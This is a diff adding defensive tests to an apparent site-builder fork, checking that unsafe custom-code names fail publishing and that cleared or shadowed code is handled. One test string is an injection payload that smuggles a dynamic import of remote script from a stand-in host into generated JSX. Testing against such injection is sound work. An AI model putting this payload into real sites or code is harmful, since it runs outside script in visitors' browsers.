@@ -17056,3 +17056,66 @@ export const createManagedFormResourceFetch = () => {
     }
   });
 });
+
+// OrganizeOS fork: custom code's tag and attribute names are checked on the
+// exact string prebuild compiles, at the point it is compiled
+// (organizeos-code-check.ts, spec 2026-11-20, 4.4).
+describe("the custom code name check", () => {
+  const reviewerPayload = '<div async/ ={import("https://x.example/a.js")}>';
+  const writeCustomCode = async ({
+    projectSettingsCode,
+    pagesCode,
+  }: {
+    projectSettingsCode?: string;
+    pagesCode?: string;
+  }) => {
+    const data = createSiteData({
+      pageMeta: pagesCode === undefined ? {} : { code: pagesCode },
+    });
+    const bundle =
+      projectSettingsCode === undefined
+        ? data
+        : {
+            ...data,
+            build: {
+              ...data.build,
+              projectSettings: {
+                meta: { code: projectSettingsCode },
+                compiler: {},
+              },
+            },
+          };
+    await writeFile(".webstudio/data.json", JSON.stringify(bundle));
+  };
+
+  test("custom code with a name JSX cannot hold fails the publish at emission, naming Custom code", async () => {
+    publishAsIfOrgScriptMayRun();
+    await writeCustomCode({ projectSettingsCode: reviewerPayload });
+    await expect(
+      prebuild({ assets: false, template: ["react-router"] })
+    ).rejects.toThrow(/^Custom code cannot be published/);
+    expect(existsSync("app/__generated__/_index.tsx")).toBe(false);
+  });
+
+  test("with embeds off, saved custom code is cleared and not checked", async () => {
+    await writeCustomCode({ projectSettingsCode: reviewerPayload });
+    await prebuild({ assets: false, template: ["react-router"] });
+    await expect(
+      readFile("app/__generated__/_index.tsx", "utf8")
+    ).resolves.toMatch(
+      /export const CustomCode = \(\) => \{\s*return \(<><\/>\);/
+    );
+  });
+
+  test("a stale pages meta code shadowed by project settings is not checked", async () => {
+    publishAsIfOrgScriptMayRun();
+    await writeCustomCode({
+      projectSettingsCode: "<b>ok</b>",
+      pagesCode: '<b @click="x">',
+    });
+    await prebuild({ assets: false, template: ["react-router"] });
+    await expect(
+      readFile("app/__generated__/_index.tsx", "utf8")
+    ).resolves.toContain('<b>{"ok"}</b>');
+  });
+});
